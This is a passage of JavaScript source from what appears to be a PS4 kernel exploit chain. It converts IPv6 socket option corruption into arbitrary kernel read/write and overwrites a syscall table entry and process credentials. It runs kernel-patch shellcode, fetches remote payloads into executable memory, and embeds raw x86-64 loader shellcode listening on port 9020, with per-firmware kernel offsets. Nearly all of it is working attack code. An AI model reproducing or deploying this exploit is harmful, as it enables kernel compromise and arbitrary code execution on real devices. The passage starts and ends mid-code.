  //log(`kernel base: ${kbase}`);
  //log('\nmaking arbitrary kernel read/write');
  const cpuid = 7 - main_core;
  const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid * 8);
  //log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
  const pcpu = kread64(pcpu_p);
  //log(`pcpu: ${pcpu}`);
  //log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
  // __pcpu[cpuid].pc_curthread
  const td = kread64(pcpu);
  //log(`td: ${td}`);
  const off_td_proc = 8;
  const proc = kread64(td.add(off_td_proc));
  //log(`proc: ${proc}`);
  const pid = sysi('getpid');
  //log(`our pid: ${pid}`);
  const pid2 = kread64(proc.add(0xb0)).lo;
  //log(`suspected proc pid: ${pid2}`);
  if (pid2 !== pid) {
    die('process not found');
  }
  const off_p_fd = 0x48;
  const p_fd = kread64(proc.add(off_p_fd));
  //log(`proc.p_fd: ${p_fd}`);
  // curthread->td_proc->p_fd->fd_ofiles
  const ofiles = kread64(p_fd);
  //log(`ofiles: ${ofiles}`);
  const off_p_ucred = 0x40;
  const p_ucred = kread64(proc.add(off_p_ucred));
  //log(`p_ucred ${p_ucred}`);
  const pipes = new View4(2);
  sysi('pipe', pipes.addr);
  const pipe_file = kread64(ofiles.add(pipes[0] * 8));
  //log(`pipe file: ${pipe_file}`);
  // ofiles[pipe_fd].f_data
  const kpipe = kread64(pipe_file);
  //log(`pipe pointer: ${kpipe}`);
  const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
  for (var off = 0; off < pipe_save.size; off += 8) {
    pipe_save.write64(off, kread64(kpipe.add(off)));
  }
  const main_sd = psd;
  const worker_sd = dirty_sd;
  const main_file = kread64(ofiles.add(main_sd * 8));
  //log(`main sock file: ${main_file}`);
  // ofiles[sd].f_data
  const main_sock = kread64(main_file);
  //log(`main sock pointer: ${main_sock}`);
  // socket.so_pcb (struct inpcb *)
  const m_pcb = kread64(main_sock.add(0x18));
  //log(`main sock pcb: ${m_pcb}`);
  // inpcb.in6p_outputopts
  const m_pktopts = kread64(m_pcb.add(0x118));
  //log(`main pktopts: ${m_pktopts}`);
  //log(`0x100 malloc zone pointer: ${k100_addr}`);
  if (m_pktopts.ne(k100_addr)) {
    die('main pktopts pointer != leaked pktopts pointer');
  }
  // ofiles[sd].f_data
  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
  //log(`reclaim sock pointer: ${reclaim_sock}`);
  // socket.so_pcb (struct inpcb *)
  const r_pcb = kread64(reclaim_sock.add(0x18));
  //log(`reclaim sock pcb: ${r_pcb}`);
  // inpcb.in6p_outputopts
  const r_pktopts = kread64(r_pcb.add(0x118));
  //log(`reclaim pktopts: ${r_pktopts}`);
  // ofiles[sd].f_data
  const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
  //log(`worker sock pointer: ${worker_sock}`);
  // socket.so_pcb (struct inpcb *)
  const w_pcb = kread64(worker_sock.add(0x18));
  //log(`worker sock pcb: ${w_pcb}`);
  // inpcb.in6p_outputopts
  const w_pktopts = kread64(w_pcb.add(0x118));
  //log(`worker pktopts: ${w_pktopts}`);
  // get restricted read/write with pktopts pair
  // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
  const w_pktinfo = w_pktopts.add(0x10);
  pktinfo.write64(0, w_pktinfo);
  pktinfo.write64(8, 0); // clear .ip6po_nexthop
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  pktinfo.write64(0, kernel_addr);
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  const kstr2 = jstr(pktinfo);
  //log(`*(&"evf cv"): ${kstr2}`);
  if (kstr2 !== 'evf cv') {
    die('pktopts read failed');
  }
  //log('achieved restricted kernel read/write');
  // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
  // using pktopts write. we can safely modify a pipe even with this limit so
  // we corrupt that instead for arbitrary read/write. pipe.pipe_map will be
  // clobbered with zeros but that's okay
  class KernelMemory {
    constructor(main_sd, worker_sd, pipes, pipe_addr) {
      this.main_sd = main_sd;
      this.worker_sd = worker_sd;
      this.rpipe = pipes[0];
      this.wpipe = pipes[1];
      this.pipe_addr = pipe_addr; // &pipe.pipe_buf
      this.pipe_addr2 = pipe_addr.add(0x10); // &pipe.pipe_buf.buffer
      this.rw_buf = new Buffer(0x14);
      this.addr_buf = new Buffer(0x14);
      this.data_buf = new Buffer(0x14);
      this.data_buf.write32(0xc, 0x40000000);
    }
    _verify_len(len) {
      if ((typeof len !== 'number') || !isFinite(len) || (Math.floor(len) !== len) || (len < 0) || (len > 0xffffffff)) {
        throw TypeError('len not a 32-bit unsigned integer');
      }
    }
    copyin(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;
      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write64(0, 0);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, dst);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi('write', this.wpipe, src, len);
    }
    copyout(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;
      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write32(0, 0x40000000);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, src);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi('read', this.rpipe, dst, len);
    }
    _read(addr) {
      const buf = this.rw_buf;
      buf.write64(0, addr);
      buf.fill(0, 8);
      ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
      gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
    }
    read8(addr) {
      this._read(addr);
      return this.rw_buf.read8(0);
    }
    read16(addr) {
      this._read(addr);
      return this.rw_buf.read16(0);
    }
    read32(addr) {
      this._read(addr);
      return this.rw_buf.read32(0);
    }
    read64(addr) {
      this._read(addr);
      return this.rw_buf.read64(0);
    }
    write8(addr, value) {
      this.rw_buf.write8(0, value);
      this.copyin(this.rw_buf.addr, addr, 1);
    }
    write16(addr, value) {
      this.rw_buf.write16(0, value);
      this.copyin(this.rw_buf.addr, addr, 2);
    }
    write32(addr, value) {
      this.rw_buf.write32(0, value);
      this.copyin(this.rw_buf.addr, addr, 4);
    }
    write64(addr, value) {
      this.rw_buf.write64(0, value);
      this.copyin(this.rw_buf.addr, addr, 8);
    }
  }
  const kmem = new KernelMemory(main_sd, worker_sd, pipes, kpipe);
  const kstr3_buf = new Buffer(8);
  kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
  const kstr3 = jstr(kstr3_buf);
  //log(`*(&"evf cv"): ${kstr3}`);
  if (kstr3 !== 'evf cv') {
    die('pipe read failed');
  }
  //log('achieved arbitrary kernel read/write');
  // RESTORE: clean corrupt pointer
  // pktopts.ip6po_rthdr = NULL
  // ABC Patch
  const off_ip6po_rthdr = 0x68;
  const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
  const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
  kmem.write64(r_rthdr_p, 0);
  kmem.write64(w_rthdr_p, 0);
  //log('corrupt pointers cleaned');
  /*
  // REMOVE once restore kernel is ready for production
  // increase the ref counts to prevent deallocation
  kmem.write32(main_sock, kmem.read32(main_sock) + 1);
  kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
  // +2 since we have to take into account the fget_write()'s reference
  kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
  */
  return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
}
//================================================================================================
// STAGE KERNEL PATCH ============================================================================
//================================================================================================
// Using JIT to load our own shellcode code here avoids the need to preform
// some trick toggle the CR0.WP bit. We can just toggle it easily within our
// shellcode.
async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
  if (!is_ps4) {
    throw RangeError('PS5 kernel patching unsupported');
  }
  if ((config_target < 0x600) || (config_target >= 0x1000)) {
    throw RangeError('kernel patching unsupported');
  }
  //log('change sys_aio_submit() to sys_kexec()');
  // sysent[661] is unimplemented so free for use
  const sysent_661 = kbase.add(off_sysent_661);
  //const sy_narg = kmem.read32(sysent_661);
  //const sy_call = kmem.read64(sysent_661.add(8));
  //const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
  // Save tweaks from Al-Azif's source
  const sysent_661_save = new Buffer(0x30); // sizeof syscall
  for (var off = 0; off < sysent_661_save.size; off += 8) {
    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
  }
  //log(`sysent[611] save addr: ${sysent_661_save.addr}`);
  //log("sysent[611] save data:");
  //hexdump(sysent_661_save);
  // .sy_narg = 6
  kmem.write32(sysent_661, 6);
  // .sy_call = gadgets['jmp qword ptr [rsi]']
  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
  // .sy_thrcnt = SY_THR_STATIC
  kmem.write32(sysent_661.add(0x2c), 1);
  //log('set the bits for JIT privs');
  // cr_sceCaps[0] // 0x2000038000000000
  kmem.write64(p_ucred.add(0x60), -1);
  // cr_sceCaps[1] // 0x800000000000ff00
  kmem.write64(p_ucred.add(0x68), -1);
  var kpatch_bin;
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      kpatch_bin = hex2uint8(kpatch0700_bin);
      break;
    case 0x750:
    case 0x751:
    case 0x755:
      kpatch_bin = hex2uint8(kpatch0750_bin);
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      kpatch_bin = hex2uint8(kpatch0800_bin);
      break;
    case 0x850:
    case 0x852:
      kpatch_bin = hex2uint8(kpatch0850_bin);
      break;
    case 0x900:
      kpatch_bin = hex2uint8(kpatch0900_bin);
      break;
    case 0x903:
    case 0x904:
      kpatch_bin = hex2uint8(kpatch0903_bin);
      break;
    case 0x950:
    case 0x951:
    case 0x960:
      kpatch_bin = hex2uint8(kpatch0950_bin);
      break;
    default:
      die('kpatch_bin file not found');
      break;
  }
//  const buf = await get_patches(patch_elf_loc);
  var buf = kpatch_bin.buffer;
  // FIXME handle .bss segment properly
  // assume start of loadable segments is at offset 0x1000
  const patches = new View1(buf);
  var map_size = patches.size;
  const max_size = 0x10000000;
  if (map_size > max_size) {
    die(`patch file too large (>${max_size}): ${map_size}`);
  }
  if (map_size === 0) {
    die('patch file size is zero');
  }
  //log(`kpatch size: ${map_size} bytes`);
  map_size = (map_size + page_size) & -page_size;
  const prot_rwx = 7;
  const prot_rx = 5;
  const prot_rw = 3;
  const exec_p = new Int(0, 9);
  const write_p = new Int(max_size, 9);
  //log('open JIT fds');
  const exec_fd = sysi('jitshm_create', 0, map_size, prot_rwx);
  //const write_fd = sysi('jitshm_alias', exec_fd, prot_rw);
  //log('mmap for kpatch shellcode');
  const exec_addr = chain.sysp(
    'mmap',
    exec_p,
    map_size,
    prot_rx,
    MAP_SHARED | MAP_FIXED,
    exec_fd,
    0
  );
  const write_addr = chain.sysp(
    'mmap',
    write_p,
    map_size,
    prot_rw,
    MAP_SHARED | MAP_FIXED,
    exec_fd,
    0
  );
  //log(`exec_addr: ${exec_addr}`);
  //log(`write_addr: ${write_addr}`);
  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
    die('mmap() for jit failed');
  }
  //log('mlock exec_addr for kernel exec');
  sysi('mlock', exec_addr, map_size);
  // mov eax, 0x1337; ret (0xc300_0013_37b8)
  const test_code = new Int(0x001337b8, 0xc300);
  write_addr.write64(0, test_code);
  //log('test jit exec');
  sys_void('kexec', exec_addr);
  var retval = chain.errno;
  //log('returned successfully');
  //log(`jit retval: ${retval}`);
  if (retval !== 0x1337) {
    die('test jit exec failed');
  }
  const pipe_save = restore_info[1];
  restore_info[1] = pipe_save.addr;
  //log('mlock pipe save data for kernel restore');
  sysi('mlock', restore_info[1], page_size);
  // Restore tweaks from Al-Azif's source
  restore_info[4] = sysent_661_save.addr;
  //log('mlock sysent_661 save data for kernel restore');
  sysi('mlock', restore_info[4], page_size);
  //log('execute kpatch...');
  mem.cpy(write_addr, patches.addr, patches.size);
  sys_void('kexec', exec_addr, ...restore_info);
  //log('setuid(0)');
  //sysi('setuid', 0);
  //log('kernel exploit succeeded!');
  //log('restore sys_aio_submit()');
  //kmem.write32(sysent_661, sy_narg);
  // .sy_call = gadgets['jmp qword ptr [rsi]']
  //kmem.write64(sysent_661.add(8), sy_call);
  // .sy_thrcnt = SY_THR_STATIC
  //kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
}
//================================================================================================
// STAGE SETUP ===================================================================================
//================================================================================================
function setup(block_fd) {
  // this part will block the worker threads from processing entries so that
  // we may cancel them instead. this is to work around the fact that
  // aio_worker_entry2() will fdrop() the file associated with the aio_entry
  // on ps5. we want aio_multi_delete() to call fdrop()
  //log('block AIO');
  const reqs1 = new Buffer(0x28 * num_workers);
  const block_id = new Word();
  for (var i = 0; i < num_workers; i++) {
    reqs1.write32(8 + i * 0x28, 1);
    reqs1.write32(0x20 + i * 0x28, block_fd);
  }
  aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
  //log('heap grooming');
  // chosen to maximize the number of 0x80 malloc allocs per submission
  const num_reqs = 3;
  const groom_ids = new View4(num_grooms);
  const groom_ids_p = groom_ids.addr;
  const greqs = make_reqs1(num_reqs);
  // allocate enough so that we start allocating from a newly created slab
  spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
  cancel_aios(groom_ids_p, num_grooms);
  //log('Setup complete');
  return [block_id, groom_ids];
}
//================================================================================================
// Create 32-bit Array from Address ==============================================================
//================================================================================================
// This function creates a "fake" Uint32Array that is backed by an
// arbitrary memory address 'addr' instead of its own data buffer.
function array_from_address(addr, size) {
  // 1. Create a normal, "original" (og) Uint32Array.
  //    Its actual contents don't matter.
  var og_array = new Uint32Array(0x1000);
  // 2. Get the memory address OF the 'og_array' JavaScript object itself.
  //    Then, add 0x10 (16 bytes) to it. This offset points to the
  //    internal metadata of the array, specifically where its
  //    "data pointer" (ArrayBufferView's 'data' field) is stored.
  var og_array_i = mem.addrof(og_array).add(0x10);
  // 3. --- This is the core of the exploit ---
  //    Overwrite the internal "data pointer" of 'og_array'.
  //    Instead of pointing to its own allocated buffer, make it point
  //    to the 'addr' that was passed into the function.
  mem.write64(og_array_i, addr);
  // 4. Overwrite the internal "length" property of 'og_array'.
  //    The array will now believe it has 'size' elements.
  //    (This offset, 0x8 bytes from the data pointer, is typical).
  mem.write32(og_array_i.add(0x8), size);
  // 5. Overwrite another internal field (likely capacity or a flag) to
  //    ensure the array is considered valid.
  mem.write32(og_array_i.add(0xc), 1);
  // 6. Push the 'og_array' to a special list (nogc = no garbage collection).
  //    This prevents the JavaScript engine from trying to "clean up"
  //    this corrupted object, which would likely cause a crash.
  nogc.push(og_array);
  // 7. Return the modified 'og_array'.
  //    Anyone using this array (e.g., `returned_array[0] = 0x...`)
  //    is NOT writing to a safe JavaScript buffer.
  //    They are writing directly to memory at 'addr'.
  return og_array;
}
//================================================================================================
// Payload Loader ================================================================================
//================================================================================================
// Allocate a small memory region (0x1000 bytes) using a system call (mmap).
// The flags 'PROT_READ | PROT_WRITE | PROT_EXEC' (RWX) are critical.
// This makes the memory Readable, Writable, and EXECUTABLE.
// This is a dangerous practice and is blocked by security measures in normal environments.
async function PayloadLoader(Pfile) {
  try {
    /*
    // Fetch the payload from payload.js
    var PLD = hex2uint8(payload_bin);
    // Calculate required padding to ensure the data length is a multiple of 4 bytes.
    // This is necessary because we will use Uint32Array (4 bytes per element) later.
    const originalLength = PLD.length;
    const paddingLength = (4 - (originalLength & 3)) & 3;
    // Create a new Uint8Array with the aligned size (original + padding)
    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
    // Copy the original payload data into the new buffer
    paddedBuffer.set(PLD, 0);
    */
    // Fetch the payload file (e.g., payload.bin) from the server
    const response = await fetch(Pfile);
    if (!response.ok) {
      throw new Error(`Payload ${Pfile} file read error: ${response.status}`);
    }
    var PLD = await response.arrayBuffer(); // Read the downloaded payload as an ArrayBuffer.
    // Calculate required padding to ensure the data length is a multiple of 4 bytes.
    // This is necessary because we will use Uint32Array (4 bytes per element) later.
    const originalLength = PLD.byteLength;
    const paddingLength = (4 - (originalLength & 3)) & 3;
    // Create a new Uint8Array with the aligned size (original + padding)
    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
    // Copy the original payload data into the new buffer
    paddedBuffer.set(new Uint8Array(PLD), 0);
    // If padding is needed, fill the remaining space with zeros
    if (paddingLength) paddedBuffer.set(new Uint8Array(paddingLength), originalLength);

    // Create a 32-bit integer view of the aligned payload buffer for copying
    const shellcode = new Uint32Array(paddedBuffer.buffer);
    // Allocate Executable, Writable, and Readable (RWX) memory using mmap system call.
    // 0x41000 = MAP_ANON | MAP_PRIVATE (Anonymous memory mapping)
    const payload_buffer = chain.sysp('mmap', 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
    // Create a custom JavaScript array view that points directly to the allocated native memory address
    const native_view = array_from_address(payload_buffer, shellcode.length);
    // Write the payload (shellcode) into the allocated executable memory
    native_view.set(shellcode);
    // Ensure the memory permissions are strictly set to RWX (Read/Write/Execute)
    chain.sys('mprotect', payload_buffer, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC);
    // Prepare the pthread structure and context for thread creation
    const ctx = new Buffer(0x10);
    const pthread = new Pointer();
    pthread.ctx = ctx;
    // Execute the payload by creating a new thread starting at the payload's memory address
    call_nze('pthread_create', pthread.addr, 0, payload_buffer, 0);
  } catch (e) {
    //log(`PayloadLoader error: ${e}`);
    return 0;
  }
  return 1;
}
//================================================================================================
// Malloc ========================================================================================
//================================================================================================
// This function is a C-style 'malloc' (memory allocate) implementation
// for this low-level exploit environment.
// It allocates a raw memory buffer of 'sz' BYTES and returns a
// raw pointer to it, bypassing normal JavaScript memory management.
function malloc(sz) {
  // 1. Allocate a standard JavaScript Uint8Array.
  //    The total size is 'sz' bytes (the requested size) plus a
  //    0x10000 byte offset (which might be for metadata or alignment).
  var backing = new Uint8Array(0x10000 + sz);
  // 2. Add this array to the 'no garbage collection' (nogc) list.
  //    This is critical to prevent the JS engine from freeing this
  //    memory block. If it were freed, 'ptr' would become a "dangling pointer"
  //    and lead to a 'use-after-free' crash.
  nogc.push(backing);
  // 3. This is the core logic to "steal" the raw pointer from the JS object.
  //    - mem.addrof(backing): Gets the address of the JS 'backing' object.
  //    - .add(0x10): Moves to the internal offset (16 bytes) where the
  //      pointer to the raw data buffer is stored.
  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
  //
  //    'ptr' now holds the *raw memory address* of the array's data.
  var ptr = mem.readp(mem.addrof(backing).add(0x10));
  // 4. Attach the original JS 'backing' array itself as a property
  //    to the 'ptr' object.
  //    This is a convenience, bundling the raw pointer ('ptr') with a
  //    "safe" JS-based way ('ptr.backing') to access the same memory.
  ptr.backing = backing;
  // 5. Return the 'ptr' object, which now acts as a raw pointer
  //    to the newly allocated block of 'sz' bytes.
  return ptr;
}
//================================================================================================
// Malloc for 32-bit =============================================================================
//================================================================================================
// This function mimics the C-standard 'malloc' function but for a 32-bit
// aligned buffer. It allocates memory using a standard JS ArrayBuffer
// but returns a *raw pointer* to its internal data buffer.
function malloc32(sz) {
  // 1. Allocate a standard JavaScript byte array.
  //    'sz * 4' suggests 'sz' is the number of 32-bit (4-byte) elements.
  //    The large base size (0x10000) might be to ensure a specific 
  //    allocation type or to hold internal metadata for this "fake malloc".
  var backing = new Uint8Array(0x10000 + sz * 4);
  // 2. Add this array to the 'no garbage collection' (nogc) list.
  //    This is CRITICAL. It prevents the JS engine from freeing this
  //    memory block. If the 'backing' array was collected, 'ptr' would
  //    become a "dangling pointer" and cause a 'use-after-free' crash.
  nogc.push(backing);
  // 3. This is the core logic for getting the raw address.
  //    - mem.addrof(backing): Gets the memory address of the JS 'backing' object.
  //    - .add(0x10): Moves to the offset (16 bytes) where the internal
  //      data pointer (pointing to the raw buffer) is stored.
  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
  //
  //    'ptr' now holds the *raw memory address* of the array's actual data.
  var ptr = mem.readp(mem.addrof(backing).add(0x10));
  // 4. This is a convenience. It attaches a 32-bit view of the *original*
  //    JS buffer (backing.buffer) as a property to the 'ptr' object.
  //    This bundles the raw pointer ('ptr') with a "safe" JS-based way
  //    to access the same memory ('ptr.backing').
  ptr.backing = new Uint32Array(backing.buffer);
  // 5. Return the 'ptr' object. This object now represents a raw
  //    pointer to the newly allocated and GC-protected memory.
  return ptr;
}
//================================================================================================
// Bin Loader ====================================================================================
//================================================================================================
function runBinLoader() {
  // 1. Allocate a large (0x300000 bytes) memory buffer for the *main* payload.
  //    It is marked as Readable, Writable, and Executable (RWX).
  //    This buffer will likely be passed AS AN ARGUMENT to the loader.
  var payload_buffer = chain.sysp('mmap', 0, 0x300000, (PROT_READ | PROT_WRITE | PROT_EXEC), MAP_ANON, -1, 0);
  // 2. Allocate a smaller (0x1000 bytes) buffer for the
  //    *loader shellcode itself* using the custom malloc32 helper.
  var payload_loader = malloc32(0x1000);
  // 3. Get the JS-accessible backing array for the loader buffer.
  var BLDR = payload_loader.backing;
  // 4. --- START OF SHELLCODE ---
  //    This is not JavaScript. This is raw x86_64 machine code, written
  //    as 32-bit integers (hex values), directly into the executable buffer.
  //    This code is the "BinLoader" itself.
  BLDR[0]  = 0x56415741; BLDR[1]  = 0x83485541; BLDR[2]  = 0x894818EC;
  BLDR[3]  = 0xC748243C; BLDR[4]  = 0x10082444; BLDR[5]  = 0x483C2302;
  BLDR[6]  = 0x102444C7; BLDR[7]  = 0x00000000; BLDR[8]  = 0x000002BF;
  BLDR[9]  = 0x0001BE00; BLDR[10] = 0xD2310000; BLDR[11] = 0x00009CE8;
  BLDR[12] = 0xC7894100; BLDR[13] = 0x8D48C789; BLDR[14] = 0xBA082474;
  BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8; BLDR[17] = 0xFF894400;
  BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800; BLDR[20] = 0x89440000;
  BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2; BLDR[23] = 0x89410000;
  BLDR[24] = 0x2C8B4CC6; BLDR[25] = 0x45C64124; BLDR[26] = 0x05EBC300;
  BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
  BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
  BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
  BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
  BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
  BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
  BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
  BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
  BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
  BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
  BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
  BLDR[60] = 0xC3050FCA;
  // --- END OF SHELLCODE ---
  // 5. Use the 'mprotect' system call to *explicitly* mark the
  //    'payload_loader' buffer as RWX (Readable, Writable, Executable).
  //    This is a "belt and suspenders" call to ensure the OS will
  //    allow the CPU to execute the shellcode we just wrote.
  chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
  // 6. Allocate memory for a pthread (thread) structure.
  var pthread = malloc(0x10);
  // 7. Lock the main payload buffer in memory to prevent it from
  //    being paged out to disk.
  sysi('mlock', payload_buffer, 0x300000);
  //    Create a new native thread.
  call_nze(
    'pthread_create',
    pthread, // Pointer to the thread structure
    0, // Thread attributes (default)
    payload_loader, // The START ROUTINE (entry point). This is the address of our shellcode.
    payload_buffer // The ARGUMENT to pass to the shellcode.
  );
  window.log("BinLoader is ready. Send a payload to port 9020 now", "green");
}
//================================================================================================
// Init LapseGlobal Variables ====================================================================
//================================================================================================
function Init_LapseGlobals() {
  // Verify mem is initialized (should be initialized by make_arw)
  if (mem === null) {
    window.log("ERROR: mem is not initialized. PSFree exploit may have failed.\nPlease refresh page and try again...", "red");
    return 0;
  }
  // Kernel offsets
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      off_kstr = 0x7f92cb;
      off_cpuid_to_pcpu = 0x212cd10;
      off_sysent_661 = 0x112d250;
      jmp_rsi = 0x6b192;
      //patch_elf_loc = "./kpatch700.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x256b0,
        'pthread_join': 0x27d00,
        'pthread_barrier_init': 0xa170,
        'pthread_barrier_wait': 0x1ee80,
        'pthread_barrier_destroy': 0xe2e0,
        'pthread_exit': 0x19fd0
      }));
      break;
    case 0x750:
      off_kstr = 0x79a92e;
      off_cpuid_to_pcpu = 0x2261070;
      off_sysent_661 = 0x1129f30;
      jmp_rsi = 0x1f842;
      //patch_elf_loc = "./kpatch750.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25800,
        'pthread_join': 0x27e60,
        'pthread_barrier_init': 0xa090,
        'pthread_barrier_wait': 0x1ef50,
        'pthread_barrier_destroy': 0xe290,
        'pthread_exit': 0x1a030
      }));
      break;
    case 0x751:
    case 0x755:
      off_kstr = 0x79a96e;
      off_cpuid_to_pcpu = 0x2261070;
      off_sysent_661 = 0x1129f30;
      jmp_rsi = 0x1f842;
      //patch_elf_loc = "./kpatch750.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25800,
        'pthread_join': 0x27e60,
        'pthread_barrier_init': 0xa090,
        'pthread_barrier_wait': 0x1ef50,
        'pthread_barrier_destroy': 0xe290,
        'pthread_exit': 0x1a030
      }));
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      off_kstr = 0x7edcff;
      off_cpuid_to_pcpu = 0x228e6b0;
      off_sysent_661 = 0x11040c0;
      jmp_rsi = 0xe629c;
      //patch_elf_loc = "./kpatch800.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25610,
        'pthread_join': 0x27c60,
        'pthread_barrier_init': 0xa0e0,
        'pthread_barrier_wait': 0x1ee00,
        'pthread_barrier_destroy': 0xe180,
        'pthread_exit': 0x19eb0
      }));
      break;
    case 0x850:
      off_kstr = 0x7da91c;
      off_cpuid_to_pcpu = 0x1cfc240;
      off_sysent_661 = 0x11041b0;
      jmp_rsi = 0xc810d;
      //patch_elf_loc = "./kpatch850.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0xebb0,
        'pthread_join': 0x29d50,
        'pthread_barrier_init': 0x283c0,
        'pthread_barrier_wait': 0xb8c0,
        'pthread_barrier_destroy': 0x9c10,
        'pthread_exit': 0x25310
      }));
      break;
    case 0x852:
      off_kstr = 0x7da91c;
      off_cpuid_to_pcpu = 0x1cfc240;
      off_sysent_661 = 0x11041b0;
      jmp_rsi = 0xc810d;
      //patch_elf_loc = "./kpatch850.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0xebb0,
        'pthread_join': 0x29d60,
        'pthread_barrier_init': 0x283d0,
        'pthread_barrier_wait': 0xb8c0,
        'pthread_barrier_destroy': 0x9c10,
        'pthread_exit': 0x25320
      }));
      break;
    case 0x900:
      off_kstr = 0x7f6f27;
      off_cpuid_to_pcpu = 0x21ef2a0;
      off_sysent_661 = 0x1107f00;
      jmp_rsi = 0x4c7ad;
      //patch_elf_loc = "./kpatch900.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25510,
        'pthread_join': 0xafa0,
        'pthread_barrier_init': 0x273d0,
        'pthread_barrier_wait': 0xa320,
        'pthread_barrier_destroy': 0xfea0,
        'pthread_exit': 0x77a0
      }));
      break;
    case 0x903:
    case 0x904:
      off_kstr = 0x7f4ce7;
      off_cpuid_to_pcpu = 0x21eb2a0;
      off_sysent_661 = 0x1103f00;
      jmp_rsi = 0x5325b;
      //patch_elf_loc = "./kpatch903.bin";
      pthread_offsets = new Map(Object.entries({
        'pthread_create': 0x25510,
        'pthread_join': 0xafa0,
        'pthread_barrier_init': 0x273d0,
        'pthread_barrier_wait': 0xa320,
        'pthread_barrier_destroy': 0xfea0,
        'pthread_exit': 0x77a0
      }));
      break;
    case 0x950:
    case 0x951:
    case 0x960:
      off_kstr = 0x769a88;
      off_cpuid_to_pcpu = 0x21a66c0;
      off_sysent_661 = 0x1100ee0;
      jmp_rsi = 0x15a6d;
      //patch_elf_loc = "./kpatch950.bin";
      pthread_offsets = new Map(Object.entries({
